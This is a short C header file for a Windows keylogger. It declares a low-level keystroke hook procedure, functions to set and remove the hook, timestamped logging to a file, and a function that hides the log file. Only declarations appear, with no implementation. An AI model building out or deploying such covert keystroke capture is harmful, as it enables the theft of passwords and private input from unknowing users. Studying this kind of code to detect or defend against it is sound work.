#ifndef LOGGER_H
#define LOGGER_H

#include <stdio.h>
#include <time.h>
#include <windows.h>

// Keylogging hook that logs low level keystrokes
LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam);

int set_keylog_hook();

void write_timestamp_to_log_file();

void hide_log_file();

void init_log_file();

int remove_key_log_hook();

#endif
